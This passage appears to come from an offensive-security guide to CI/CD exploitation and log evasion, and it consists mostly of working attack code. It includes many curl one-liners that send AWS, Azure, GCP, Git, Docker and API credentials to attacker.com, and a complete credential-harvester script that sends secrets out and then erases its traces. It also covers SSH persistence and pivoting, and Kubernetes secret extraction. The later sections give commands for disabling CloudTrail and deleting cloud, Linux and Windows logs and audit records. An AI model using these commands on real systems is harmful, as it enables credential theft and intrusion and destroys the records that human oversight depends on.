# Extract from environment variables in CI/CD job
echo "AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID" | curl -X POST -d @- http://attacker.com/aws
echo "AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY" | curl -X POST -d @- http://attacker.com/aws

# Extract from ~/.aws/credentials
cat ~/.aws/credentials | base64 | curl -X POST -d @- http://attacker.com/aws-creds

# Extract from EC2 instance metadata (if runner is EC2 instance)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ | \
  xargs -I {} curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{} | \
  curl -X POST -d @- http://attacker.com/ec2-role-creds
```

**Azure Service Principal:**

```bash
# Extract Azure credentials from environment
echo "AZURE_CLIENT_ID: $AZURE_CLIENT_ID" | curl -X POST -d @- http://attacker.com/azure
echo "AZURE_CLIENT_SECRET: $AZURE_CLIENT_SECRET" | curl -X POST -d @- http://attacker.com/azure
echo "AZURE_TENANT_ID: $AZURE_TENANT_ID" | curl -X POST -d @- http://attacker.com/azure

# Extract from Azure CLI config
cat ~/.azure/azureProfile.json | base64 | curl -X POST -d @- http://attacker.com/azure-profile
cat ~/.azure/clouds.config | base64 | curl -X POST -d @- http://attacker.com/azure-clouds

# Extract from Azure VM metadata service (if runner is Azure VM)
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
  curl -X POST -d @- http://attacker.com/azure-token
```

**GCP Service Account:**

```bash
# Extract service account key from environment
echo "$GCP_SERVICE_ACCOUNT_KEY" | base64 -d | curl -X POST -d @- http://attacker.com/gcp-key

# Extract from default location
cat ~/.config/gcloud/application_default_credentials.json | curl -X POST -d @- http://attacker.com/gcp-creds

# Extract from GCE metadata service (if runner is GCE instance)
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" | curl -X POST -d @- http://attacker.com/gce-token

curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google" | curl -X POST -d @- http://attacker.com/gce-email
```

### Git Credential Extraction

```bash
# Extract Git credentials from credential store
cat ~/.git-credentials | base64 | curl -X POST -d @- http://attacker.com/git-creds

# Extract from Git config
cat ~/.gitconfig | base64 | curl -X POST -d @- http://attacker.com/git-config
cat .git/config | base64 | curl -X POST -d @- http://attacker.com/repo-config

# Extract Git credential helper cache
git credential fill <<EOF | curl -X POST -d @- http://attacker.com/git-helper
protocol=https
host=github.com

EOF

# Dump all configured remotes (may contain embedded credentials)
git remote -v | base64 | curl -X POST -d @- http://attacker.com/git-remotes

# Extract credentials from remote URLs
git config --get remote.origin.url | grep -oP '(?<=://).*(?=@)' | curl -X POST -d @- http://attacker.com/embedded-creds
```

### Docker Registry Credentials

```bash
# Extract Docker credentials
cat ~/.docker/config.json | base64 | curl -X POST -d @- http://attacker.com/docker-creds

# Parse and decode auth tokens
cat ~/.docker/config.json | jq -r '.auths | to_entries[] | "\(.key): \(.value.auth)"' | while read entry; do
  echo "$entry" | awk -F': ' '{print $1, $2}' | while read registry auth; do
    decoded=$(echo "$auth" | base64 -d)
    echo "$registry: $decoded" | curl -X POST -d @- http://attacker.com/registry-creds
  done
done

# Extract from Docker daemon config
sudo cat /etc/docker/daemon.json | curl -X POST -d @- http://attacker.com/docker-daemon

# Extract from containerd config (if applicable)
sudo cat /etc/containerd/config.toml | base64 | curl -X POST -d @- http://attacker.com/containerd-config
```

### Database Connection Strings

```bash
# Common environment variables containing database credentials
env | grep -iE 'db|database|mysql|postgres|mongo|redis|sql' | base64 | curl -X POST -d @- http://attacker.com/db-vars

# Extract from application configuration files
find . -type f \( -name "*.env" -o -name "*.config" -o -name "*.yml" -o -name "*.yaml" -o -name "*.json" \) \
  -exec grep -iH 'password\|secret\|token\|key\|connectionstring' {} \; | base64 | curl -X POST -d @- http://attacker.com/app-configs

# Common connection string patterns
grep -r "mongodb://" . | base64 | curl -X POST -d @- http://attacker.com/mongo-strings
grep -r "postgresql://" . | base64 | curl -X POST -d @- http://attacker.com/postgres-strings
grep -r "mysql://" . | base64 | curl -X POST -d @- http://attacker.com/mysql-strings
grep -r "redis://" . | base64 | curl -X POST -d @- http://attacker.com/redis-strings
```

### API Keys and Tokens

```bash
# Extract common API keys from environment
echo "GITHUB_TOKEN: $GITHUB_TOKEN" | curl -X POST -d @- http://attacker.com/tokens
echo "GITLAB_TOKEN: $GITLAB_TOKEN" | curl -X POST -d @- http://attacker.com/tokens
echo "SLACK_TOKEN: $SLACK_TOKEN" | curl -X POST -d @- http://attacker.com/tokens
echo "DATADOG_API_KEY: $DATADOG_API_KEY" | curl -X POST -d @- http://attacker.com/tokens
echo "SENTRY_AUTH_TOKEN: $SENTRY_AUTH_TOKEN" | curl -X POST -d @- http://attacker.com/tokens
echo "NPM_TOKEN: $NPM_TOKEN" | curl -X POST -d @- http://attacker.com/tokens

# Search filesystem for token patterns
grep -r -oE '[a-f0-9]{40}' . | head -20 | curl -X POST -d @- http://attacker.com/hex-tokens
grep -r -oE 'ghp_[a-zA-Z0-9]{36}' . | curl -X POST -d @- http://attacker.com/github-tokens
grep -r -oE 'glpat-[a-zA-Z0-9_-]{20}' . | curl -X POST -d @- http://attacker.com/gitlab-tokens
grep -r -oE 'xox[baprs]-[a-zA-Z0-9-]+' . | curl -X POST -d @- http://attacker.com/slack-tokens
```

### Tools for Credential Discovery

**GitLeaks on Runner:**

```bash
# Run gitleaks in CI/CD job to find secrets in repository
gitleaks detect --source . --verbose --report-path leaks.json

# Exfiltrate findings
cat leaks.json | curl -X POST -d @- http://attacker.com/gitleaks-findings

# Scan Git history for removed secrets
gitleaks detect --source . --log-opts="--all" --verbose
```

**TruffleHog in Pipeline:**

```bash
# Add to CI/CD pipeline to scan current commit
trufflehog git file://. --json | curl -X POST -d @- http://attacker.com/trufflehog-findings

# Scan specific branch
trufflehog git file://. --branch main --only-verified

# Focus on entropy-based detection
trufflehog git file://. --entropy=True --regex=False
```

**Custom Credential Extraction Script:**

```bash
#!/bin/bash
# credential-harvester.sh - Comprehensive credential extraction

OUTPUT_DIR="/tmp/.cred_harvest_$(date +%s)"
mkdir -p "$OUTPUT_DIR"
EXFIL_URL="http://attacker.com/harvest"

echo "[*] Starting credential harvest..."

# Environment variables
env > "$OUTPUT_DIR/env.txt"
env | grep -iE 'key|token|secret|password|credential|api' > "$OUTPUT_DIR/env_filtered.txt"

# SSH keys
find ~/.ssh /root/.ssh /home/*/.ssh -type f 2>/dev/null | while read key; do
  cp "$key" "$OUTPUT_DIR/ssh_$(basename $key)_$(echo $key | md5sum | cut -d' ' -f1)" 2>/dev/null
done

# Cloud credentials
cp ~/.aws/credentials "$OUTPUT_DIR/aws_credentials" 2>/dev/null
cp ~/.aws/config "$OUTPUT_DIR/aws_config" 2>/dev/null
cp ~/.azure/azureProfile.json "$OUTPUT_DIR/azure_profile.json" 2>/dev/null
cp ~/.config/gcloud/application_default_credentials.json "$OUTPUT_DIR/gcp_adc.json" 2>/dev/null

# Docker credentials
cp ~/.docker/config.json "$OUTPUT_DIR/docker_config.json" 2>/dev/null

# Git credentials
cp ~/.git-credentials "$OUTPUT_DIR/git_credentials" 2>/dev/null
cp ~/.gitconfig "$OUTPUT_DIR/gitconfig" 2>/dev/null

# Kubernetes
cp ~/.kube/config "$OUTPUT_DIR/kubeconfig" 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token > "$OUTPUT_DIR/k8s_sa_token" 2>/dev/null

# Application configs
find . /app /var/www /opt -type f \( -name "*.env" -o -name ".env.*" -o -name "config.yml" -o -name "config.yaml" -o -name "secrets.yml" \) \
  -exec cp {} "$OUTPUT_DIR/" \; 2>/dev/null

# Database configs
find /etc -name "*.conf" 2>/dev/null | xargs grep -l -iE 'password|connectionstring' | while read conf; do
  cp "$conf" "$OUTPUT_DIR/$(basename $conf)_$(echo $conf | md5sum | cut -d' ' -f1)" 2>/dev/null
done

# Process list (may reveal command-line credentials)
ps auxww > "$OUTPUT_DIR/processes.txt" 2>/dev/null

# Network connections (may reveal active connections to databases, APIs)
netstat -tulanp > "$OUTPUT_DIR/netstat.txt" 2>/dev/null
ss -tulnap > "$OUTPUT_DIR/ss.txt" 2>/dev/null

# Archive and exfiltrate
cd /tmp
tar -czf harvest.tar.gz .cred_harvest_* 2>/dev/null
base64 harvest.tar.gz | curl -X POST -d @- "$EXFIL_URL"

# Clean up traces
rm -rf "$OUTPUT_DIR" harvest.tar.gz

echo "[*] Harvest complete and exfiltrated"
```

**Usage in CI/CD Pipeline:**

```yaml
# .gitlab-ci.yml
harvest:
  script:
    - curl -s http://attacker.com/credential-harvester.sh | bash
  only:
    - main
```

### SSH Key Exploitation

Once deployment SSH keys are extracted:

```bash
# Save extracted private key
cat > deploy_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[extracted key content]
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 deploy_key

# Identify key type and fingerprint
ssh-keygen -l -f deploy_key

# Test key against known hosts (from known_hosts file)
ssh -i deploy_key user@production-server.example.com

# If host unknown, attempt common usernames
for user in root admin ubuntu ec2-user deploy git; do
  echo "[*] Trying user: $user"
  ssh -i deploy_key -o StrictHostKeyChecking=no $user@target-server.example.com "whoami && hostname"
done

# Enumerate authorized_keys on compromised host
ssh -i deploy_key user@server "cat ~/.ssh/authorized_keys"

# Add persistence key
ssh -i deploy_key user@server "echo 'ssh-rsa AAAAB3... attacker@evil' >> ~/.ssh/authorized_keys"

# Pivot to other systems
ssh -i deploy_key user@server "cat ~/.ssh/known_hosts" | awk '{print $1}' | while read host; do
  ssh -i deploy_key user@$host "whoami && hostname"
done
```

### AWS Credential Exploitation

```bash
# Configure AWS CLI with extracted credentials
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_DEFAULT_REGION="us-east-1"

# Verify credentials work
aws sts get-caller-identity

# Enumerate permissions
aws iam get-user
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
aws iam list-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# Common CI/CD credential permissions worth testing:
# S3 access
aws s3 ls
aws s3 ls s3://production-bucket

# ECR access
aws ecr describe-repositories
aws ecr get-login-password | docker login --username AWS --password-stdin <account-id>.dkr.ecr.us-east-1.amazonaws.com

# ECS/EC2 access
aws ecs list-clusters
aws ec2 describe-instances

# Lambda access
aws lambda list-functions
aws lambda get-function --function-name production-api

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id production/database/credentials

# Systems Manager Parameter Store
aws ssm describe-parameters
aws ssm get-parameters --names "/production/api/key" --with-decryption
```

**Enumerate All AWS Permissions:**

```bash
# Install enumerate-iam
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam
pip install -r requirements.txt

# Run enumeration
python enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY

# Output shows all accessible services and actions
```

### Azure Credential Exploitation

```bash
# Login with service principal
az login --service-principal \
  --username $AZURE_CLIENT_ID \
  --password $AZURE_CLIENT_SECRET \
  --tenant $AZURE_TENANT_ID

# Verify identity
az account show

# List accessible subscriptions
az account list

# Enumerate resources
az resource list --output table

# Common CI/CD service principal permissions:
# Storage account access
az storage account list
az storage container list --account-name productionstorage

# Container registry access
az acr list
az acr repository list --name productionregistry

# Key Vault access (common place for secrets)
az keyvault list
az keyvault secret list --vault-name production-keyvault
az keyvault secret show --vault-name production-keyvault --name database-password

# AKS access
az aks list
az aks get-credentials --resource-group production-rg --name production-cluster

# VM access
az vm list
az vm run-command invoke --resource-group production-rg --name production-vm --command-id RunShellScript --scripts "whoami && hostname"
```

### GCP Credential Exploitation

```bash
# Authenticate with service account key
gcloud auth activate-service-account --key-file=service-account-key.json

# Verify identity
gcloud auth list
gcloud config list

# List accessible projects
gcloud projects list

# Set active project
gcloud config set project production-project-id

# Common CI/CD service account permissions:
# GCS access
gsutil ls
gsutil ls gs://production-bucket

# GCR access
gcloud container images list --repository=gcr.io/production-project

# GKE access
gcloud container clusters list
gcloud container clusters get-credentials production-cluster --zone us-central1-a

# Compute Engine access
gcloud compute instances list

# Secret Manager access
gcloud secrets list
gcloud secrets versions access latest --secret="database-password"

# Cloud Functions access
gcloud functions list
gcloud functions describe production-api
```

### Kubernetes Service Account Exploitation

```bash
# Use extracted service account token
export TOKEN="eyJhbGciOiJSUzI1NiIs..."
export APISERVER="https://kubernetes.production.example.com:6443"
export NAMESPACE="production"

# Test token validity
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# Check permissions with kubectl
kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify auth can-i --list

# Common checks:
kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify get pods -n $NAMESPACE
kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify get secrets -n $NAMESPACE
kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify get configmaps -n $NAMESPACE

# Extract secrets if permissions allow
kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify get secrets -n $NAMESPACE -o json | \
  jq -r '.items[] | .metadata.name' | while read secret; do
    echo "[+] Secret: $secret"
    kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify get secret $secret -n $NAMESPACE -o json | \
      jq -r '.data | to_entries[] | "\(.key): \(.value)"' | while read entry; do
        echo "$entry" | awk -F': ' '{print $1, $2}' | while read key val; do
          echo "  $key: $(echo $val | base64 -d)"
        done
      done
  done

# If exec permissions available, gain shell in pod
kubectl --token="$TOKEN" --server=$APISERVER --insecure-skip-tls-verify exec -it <pod-name> -n $NAMESPACE -- /bin/bash
```

### Automated Credential Testing Framework

```python
#!/usr/bin/env python3
# credential-validator.py - Test extracted credentials

import subprocess
import json
import sys

def test_aws_creds(access_key, secret_key):
    """Test AWS credentials"""
    try:
        result = subprocess.run(
            ['aws', 'sts', 'get-caller-identity'],
            env={'AWS_ACCESS_KEY_ID': access_key, 'AWS_SECRET_ACCESS_KEY': secret_key},
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            identity = json.loads(result.stdout)
            return {
                'valid': True,
                'account': identity.get('Account'),
                'arn': identity.get('Arn'),
                'user_id': identity.get('UserId')
            }
    except Exception as e:
        return {'valid': False, 'error': str(e)}
    return {'valid': False}

def test_github_token(token):
    """Test GitHub personal access token"""
    try:
        result = subprocess.run(
            ['curl', '-s', '-H', f'Authorization: token {token}', 
             'https://api.github.com/user'],
            capture_output=True, text=True, timeout=10
        )
        data = json.loads(result.stdout)
        if 'login' in data:
            return {
                'valid': True,
                'username': data.get('login'),
                'name': data.get('name'),
                'email': data.get('email')
            }
    except Exception as e:
        return {'valid': False, 'error': str(e)}
    return {'valid': False}

def test_docker_creds(registry, username, password):
    """Test Docker registry credentials"""
    try:
        result = subprocess.run(
            ['docker', 'login', registry, '-u', username, '--password-stdin'],
            input=password, text=True, capture_output=True, timeout=10
        )
        return {'valid': result.returncode == 0, 'output': result.stdout}
    except Exception as e:
        return {'valid': False, 'error': str(e)}

def test_ssh_key(key_path, host, user='root'):
    """Test SSH key"""
    try:
        result = subprocess.run(
            ['ssh', '-i', key_path, '-o', 'StrictHostKeyChecking=no',
             '-o', 'ConnectTimeout=5', f'{user}@{host}', 'whoami'],
            capture_output=True, text=True, timeout=10
        )
        return {'valid': result.returncode == 0, 'output': result.stdout.strip()}
    except Exception as e:
        return {'valid': False, 'error': str(e)}

def main():
    print("[*] Credential Validation Framework")
    
    # Example usage
    credentials = {
        'aws': [
            {'access_key': 'AKIAIOSFODNN7EXAMPLE', 'secret_key': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCY'},
        ],
        'github': [
            {'token': 'ghp_abcdefghijklmnopqrstuvwxyz123456'},
        ],
        'docker': [
            {'registry': 'registry.example.com', 'username': 'admin', 'password': 'pass123'},
        ],
        'ssh': [
            {'key_path': '/tmp/deploy_key', 'host': '10.0.1.50', 'user': 'ubuntu'},
        ]
    }
    
    print("\n[*] Testing AWS credentials...")
    for cred in credentials.get('aws', []):
        result = test_aws_creds(cred['access_key'], cred['secret_key'])
        print(f"  Access Key: {cred['access_key'][:20]}... - Valid: {result['valid']}")
        if result['valid']:
            print(f"    ARN: {result.get('arn')}")
    
    print("\n[*] Testing GitHub tokens...")
    for cred in credentials.get('github', []):
        result = test_github_token(cred['token'])
        print(f"  Token: {cred['token'][:15]}... - Valid: {result['valid']}")
        if result['valid']:
            print(f"    Username: {result.get('username')}")
    
    print("\n[*] Testing Docker credentials...")
    for cred in credentials.get('docker', []):
        result = test_docker_creds(cred['registry'], cred['username'], cred['password'])
        print(f"  Registry: {cred['registry']}, User: {cred['username']} - Valid: {result['valid']}")
    
    print("\n[*] Testing SSH keys...")
    for cred in credentials.get('ssh', []):
        result = test_ssh_key(cred['key_path'], cred['host'], cred['user'])
        print(f"  Host: {cred['host']}, User: {cred['user']} - Valid: {result['valid']}")
        if result['valid']:
            print(f"    Remote user: {result.get('output')}")

if __name__ == '__main__':
    main()
```

### Defense and Detection Considerations

[Inference] CI/CD security monitoring typically includes:

**GitLab CI/CD:**

- Audit logs track pipeline creation, variable access, and runner activity
- Failed authentication attempts logged
- Unusual pipeline execution patterns may trigger alerts

**GitHub Actions:**

- Audit log tracks workflow runs, secret access
- Actions triggered from forks have restricted secret access by default
- Third-party actions require approval in organization settings

**Jenkins:**

- Audit Trail Plugin logs credential access
- Script Console usage logged if monitoring enabled
- Unusual job creation or modification may trigger alerts

[Unverified] Detection capabilities depend on proper logging configuration and SIEM integration, which varies significantly across organizations.

---

## Related Topics for Comprehensive CI/CD Security

For complete CI/CD exploitation capabilities, consider studying:

- **Artifact Repository Exploitation**: Nexus, Artifactory, npm registry compromise
- **Build System Backdoors**: Persistent access through build job modification
- **Secrets Management Exploitation**: HashiCorp Vault, AWS Secrets Manager, Azure Key Vault attacks
- **Supply Chain Dependency Confusion**: Private package namespace hijacking

---

# Logging & Monitoring Evasion

## CloudTrail Tampering

### Understanding CloudTrail Architecture

CloudTrail records AWS API calls and delivers log files to S3 buckets. Each event contains metadata including:

- Event source, name, and time
- User identity and source IP
- Request parameters and response elements
- Error codes (if applicable)

**Key CloudTrail Components:**

- **Trails**: Configuration that defines which events to log
- **Event History**: 90-day rolling window of management events (read/write)
- **Log Files**: JSON-formatted records delivered to S3
- **Log File Integrity Validation**: Optional digest files for tampering detection

### CloudTrail Tampering Techniques

#### 1. Trail Disruption

**Stop Logging:**

```bash
# Stop a specific trail
aws cloudtrail stop-logging --name <trail-name>

# List all trails first
aws cloudtrail describe-trails

# Verify logging status
aws cloudtrail get-trail-status --name <trail-name>
```

**Delete Trail:**

```bash
# Delete trail configuration (does not delete existing logs)
aws cloudtrail delete-trail --name <trail-name>

# Delete across all regions
aws cloudtrail delete-trail --name <trail-name> --region us-east-1
```

**Update Trail to Invalid S3 Bucket:**

```bash
# Redirect logs to non-existent or inaccessible bucket
aws cloudtrail update-trail --name <trail-name> \
    --s3-bucket-name invalid-bucket-name

# This causes logging failures without stopping the trail
```

#### 2. S3 Bucket Manipulation

**Direct Log Deletion:**

```bash
# List CloudTrail logs in S3
aws s3 ls s3://<bucket-name>/AWSLogs/<account-id>/CloudTrail/ --recursive

# Delete specific log files
aws s3 rm s3://<bucket-name>/AWSLogs/<account-id>/CloudTrail/<region>/<year>/<month>/<day>/ \
    --recursive

# Delete with specific time range (using grep filtering)
aws s3 ls s3://<bucket-name>/AWSLogs/<account-id>/CloudTrail/ --recursive | \
    grep "2024/10/24" | awk '{print $4}' | \
    xargs -I {} aws s3 rm s3://<bucket-name>/{}
```

**Bucket Policy Modification:**

```bash
# Remove CloudTrail write permissions
aws s3api get-bucket-policy --bucket <bucket-name> > policy.json

# Edit policy.json to remove CloudTrail permissions, then:
aws s3api put-bucket-policy --bucket <bucket-name> --policy file://policy.json

# Or delete bucket policy entirely
aws s3api delete-bucket-policy --bucket <bucket-name>
```

**Lifecycle Policy Manipulation:**

```bash
# Create aggressive deletion policy
cat > lifecycle.json << EOF
{
  "Rules": [
    {
      "Id": "DeleteCloudTrailLogs",
      "Status": "Enabled",
      "Prefix": "AWSLogs/",
      "Expiration": {
        "Days": 1
      }
    }
  ]
}
EOF

aws s3api put-bucket-lifecycle-configuration \
    --bucket <bucket-name> \
    --lifecycle-configuration file://lifecycle.json
```

#### 3. Event Selector Manipulation

**Modify Trail to Exclude Sensitive Actions:**

```bash
# Get current event selectors
aws cloudtrail get-event-selectors --trail-name <trail-name>

# Update to exclude data events or specific resources
aws cloudtrail put-event-selectors --trail-name <trail-name> \
    --event-selectors '[
        {
            "ReadWriteType": "WriteOnly",
            "IncludeManagementEvents": true,
            "DataResources": []
        }
    ]'

# Exclude specific S3 buckets from logging
aws cloudtrail put-event-selectors --trail-name <trail-name> \
    --event-selectors '[
        {
            "ReadWriteType": "All",
            "IncludeManagementEvents": true,
            "DataResources": [
                {
                    "Type": "AWS::S3::Object",
                    "Values": ["arn:aws:s3:::<excluded-bucket>/*"]
                }
            ],
            "ExcludeManagementEventSources": []
        }
    ]'
```

#### 4. Digest File Manipulation

[Inference] If log file integrity validation is enabled, CloudTrail creates digest files that contain hashes of log files. Tampering with these requires more sophisticated approaches:

```bash
# Check if validation is enabled
aws cloudtrail describe-trails --trail-name-list <trail-name> | \
    grep LogFileValidationEnabled

# Disable validation
aws cloudtrail update-trail --name <trail-name> \
    --no-enable-log-file-validation
```

**Note:** Disabling validation itself generates a CloudTrail event (`UpdateTrail`), creating evidence of tampering.

#### 5. KMS Key Manipulation

If CloudTrail uses KMS encryption:

```bash
# Identify KMS key used by trail
aws cloudtrail describe-trails --trail-name-list <trail-name> | \
    grep KmsKeyId

# Disable or schedule key deletion
aws kms disable-key --key-id <key-id>

aws kms schedule-key-deletion --key-id <key-id> --pending-window-in-days 7

# This prevents CloudTrail from encrypting new logs
```

### Detection Artifacts

[Unverified] The following actions typically generate CloudTrail events that may alert defenders:

- `StopLogging`
- `DeleteTrail`
- `UpdateTrail`
- `PutEventSelectors`
- `DeleteBucket` / `DeleteObject` (S3)
- `PutBucketPolicy`
- `DisableKey` (KMS)

---

## Log Deletion Techniques

### AWS-Specific Log Deletion

#### CloudWatch Logs

**Delete Log Groups:**

```bash
# List log groups
aws logs describe-log-groups

# Delete specific log group
aws logs delete-log-group --log-group-name <log-group-name>

# Delete multiple groups (bash loop)
for group in $(aws logs describe-log-groups --query 'logGroups[*].logGroupName' --output text); do
    aws logs delete-log-group --log-group-name $group
done
```

**Delete Log Streams:**

```bash
# List streams in a group
aws logs describe-log-streams --log-group-name <log-group-name>

# Delete specific stream
aws logs delete-log-stream \
    --log-group-name <log-group-name> \
    --log-stream-name <log-stream-name>
```

**Modify Retention:**

```bash
# Set aggressive retention (1 day)
aws logs put-retention-policy \
    --log-group-name <log-group-name> \
    --retention-in-days 1

# Remove retention policy (logs kept indefinitely by default, but can be changed)
aws logs delete-retention-policy --log-group-name <log-group-name>
```

#### VPC Flow Logs

```bash
# List flow logs
aws ec2 describe-flow-logs

# Delete flow log
aws ec2 delete-flow-logs --flow-log-ids <flow-log-id>

# Delete associated CloudWatch log group
aws logs delete-log-group --log-group-name <vpc-flow-log-group>
```

#### S3 Access Logs

```bash
# Disable S3 server access logging
aws s3api put-bucket-logging \
    --bucket <target-bucket> \
    --bucket-logging-status {}

# Delete existing access logs
aws s3 rm s3://<log-bucket>/logs/ --recursive
```

#### ELB/ALB Access Logs

```bash
# Disable ELB access logs
aws elb modify-load-balancer-attributes \
    --load-balancer-name <lb-name> \
    --load-balancer-attributes \
    "AccessLog={Enabled=false}"

# For ALB/NLB
aws elbv2 modify-load-balancer-attributes \
    --load-balancer-arn <lb-arn> \
    --attributes Key=access_logs.s3.enabled,Value=false

# Delete log files from S3
aws s3 rm s3://<log-bucket>/<prefix> --recursive
```

#### Lambda Logs

```bash
# List Lambda log groups
aws logs describe-log-groups --log-group-name-prefix /aws/lambda/

# Delete Lambda function logs
aws logs delete-log-group --log-group-name /aws/lambda/<function-name>
```

#### RDS Logs

```bash
# List available logs
aws rds describe-db-log-files --db-instance-identifier <instance-id>

# Download and delete (some RDS engines allow deletion)
aws rds download-db-log-file-portion \
    --db-instance-identifier <instance-id> \
    --log-file-name <log-file-name> \
    --output text > /dev/null

# Modify retention
aws rds modify-db-instance \
    --db-instance-identifier <instance-id> \
    --cloudwatch-logs-export-configuration \
    '{"DisableLogTypes": ["error","general","slowquery"]}'
```

### Linux System Log Deletion

#### Standard Log Locations

```bash
# Critical log files on Linux
/var/log/auth.log          # Debian/Ubuntu authentication
/var/log/secure            # RHEL/CentOS authentication
/var/log/syslog            # System messages
/var/log/messages          # RHEL system messages
/var/log/kern.log          # Kernel logs
/var/log/cron              # Cron job logs
/var/log/apache2/          # Apache web server
/var/log/nginx/            # Nginx web server
/var/log/mysql/            # MySQL database
~/.bash_history            # User command history
/var/log/wtmp              # Login records
/var/log/btmp              # Failed login attempts
/var/log/lastlog           # Last login information
```

#### Basic Deletion Methods

```bash
# Simple deletion (leaves file system artifacts)
rm -f /var/log/auth.log
rm -f ~/.bash_history

# Truncate without deletion (preserves inode)
> /var/log/auth.log
echo "" > /var/log/auth.log
truncate -s 0 /var/log/auth.log

# Selective deletion using sed
sed -i '/specific_pattern/d' /var/log/auth.log

# Delete specific time range
sed -i '/Oct 24 14:00/,/Oct 24 15:00/d' /var/log/syslog
```

#### Secure Deletion

```bash
# Shred (overwrites data multiple times)
shred -vfz -n 5 /var/log/auth.log

# wipe (secure deletion tool)
wipe -rf /var/log/auth.log

# srm (secure rm)
srm -vz /var/log/auth.log

# dd overwrite
dd if=/dev/urandom of=/var/log/auth.log bs=1M count=10
rm /var/log/auth.log
```

#### Journal/Systemd Logs

```bash
# View journal size
journalctl --disk-usage

# Clear all journal logs
journalctl --rotate
journalctl --vacuum-time=1s

# Delete logs older than X
journalctl --vacuum-time=1d
journalctl --vacuum-size=100M

# Clear specific service logs
journalctl --rotate --vacuum-time=1s _SYSTEMD_UNIT=ssh.service

# Disable persistent logging
rm -rf /var/log/journal/*
systemctl restart systemd-journald
```

#### Command History Evasion

```bash
# Disable history for current session
unset HISTFILE
export HISTSIZE=0

# Clear current history
history -c
history -w

# Delete history file
rm ~/.bash_history
rm ~/.zsh_history

# Prevent commands from being logged (space prefix in bash)
 command_not_logged

# Execute without history (bash)
set +o history
command_here
set -o history

# Link history to /dev/null
ln -sf /dev/null ~/.bash_history
```

#### Audit Log Manipulation

```bash
# Check if auditd is running
systemctl status auditd

# Stop audit daemon (requires root)
service auditd stop
systemctl stop auditd

# Delete audit logs
rm -f /var/log/audit/audit.log*
aureport --start today --end now > /dev/null  # This doesn't delete but can cause confusion

# Disable audit
auditctl -e 0

# Clear audit rules
auditctl -D
```

#### wtmp/utmp/btmp Manipulation

```bash
# Clear all login records
> /var/log/wtmp
> /var/log/btmp
> /var/run/utmp

# Remove specific user entries (utmpdump/utmpedit)
utmpdump /var/log/wtmp | grep -v "username" | utmpdump -r > /tmp/wtmp_new
mv /tmp/wtmp_new /var/log/wtmp

# Using 'last' to verify
last -f /var/log/wtmp
```

### Windows Log Deletion

#### Event Log Clearing

```powershell
# Clear specific event log (PowerShell)
Clear-EventLog -LogName Security
Clear-EventLog -LogName System
Clear-EventLog -LogName Application

# Clear all logs
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }

# Using wevtutil (cmd)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear specific events by ID
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | 
    ForEach-Object { Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security" }
```

[Inference] Event log clearing generates Event ID 1102 (Security log cleared) or 104 (System log cleared), which may alert defenders unless monitoring is also disabled.

#### PowerShell History Deletion

```powershell
# Clear current session history
Clear-History

# Delete history file
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Disable history for session
Set-PSReadlineOption -HistorySaveStyle SaveNothing

# Delete all user history
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\*_history.txt"
```

#### IIS Log Deletion

```powershell
# Default IIS log location
Remove-Item "C:\inetpub\logs\LogFiles\*" -Recurse -Force

# Disable IIS logging
Import-Module WebAdministration
Set-WebConfigurationProperty -Filter "system.webServer/httpLogging" `
    -Name "dontLog" -Value $true -PSPath "IIS:\Sites\Default Web Site"
```

### Container/Cloud-Native Logs

#### Docker Logs

```bash
# View container logs
docker logs <container-id>

# Clear container logs (truncate log file)
truncate -s 0 $(docker inspect --format='{{.LogPath}}' <container-id>)

# Remove container (removes logs)
docker rm <container-id>

# Disable logging for container
docker run --log-driver=none <image>
```

#### Kubernetes Logs

```bash
# Pod logs are stored on nodes at:
# /var/log/pods/<namespace>_<pod-name>_<uid>/<container>/

# Delete pod logs (requires node access)
find /var/log/pods -type f -name "*.log" -delete

# In kubelet configuration, set:
# --max-log-size=1
# --max-log-files=1
```

---

## Monitoring Bypass

### CloudWatch Evasion

#### Metric Filter Tampering

```bash
# List metric filters
aws logs describe-metric-filters --log-group-name <log-group-name>

# Delete metric filter
aws logs delete-metric-filter \
